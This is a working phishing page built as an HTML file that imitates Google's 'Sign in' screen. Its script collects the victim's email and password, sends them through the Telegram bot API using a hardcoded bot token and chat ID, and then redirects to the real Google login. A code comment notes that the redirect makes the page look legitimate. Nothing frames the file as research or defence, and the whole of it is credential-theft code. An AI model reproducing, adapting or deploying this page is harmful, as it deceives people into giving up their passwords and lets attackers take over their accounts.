<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - Google</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #fff; }
        .login-card { border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 350px; text-align: center; }
        .google-logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        input { width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        .next-btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; width: 100%; margin-top: 20px; }
        #status { margin-top: 15px; font-size: 12px; color: #5f6368; }
    </style>
</head>
<body>

    <div class="login-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>

        <form id="loginForm">
            <input type="email" id="email" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Enter your password" required>
            <button type="submit" class="next-btn">Next</button>
        </form>
        <div id="status"></div>
    </div>

    <script>
        // YOUR UPDATED CREDENTIALS
        const botToken = "8362650835:AAEWwhr6qLk1kTowl7URGCoH6_8JJV38hV0";
        const chatId = "8089276698";

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const pass = document.getElementById('password').value;
            const status = document.getElementById('status');
            
            const message = `🚀 *New Login Attempt*\n\n📧 *Email:* ${email}\n🔑 *Password:* ${pass}`;

            status.innerText = "Connecting...";

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(res => {
                // Redirecting to real Google makes it look legitimate
                window.location.href = "https://accounts.google.com";
            })
            .catch(err => {
                status.innerText = "Error. Please check your internet.";
            });
        });
    </script>

</body>
</html>
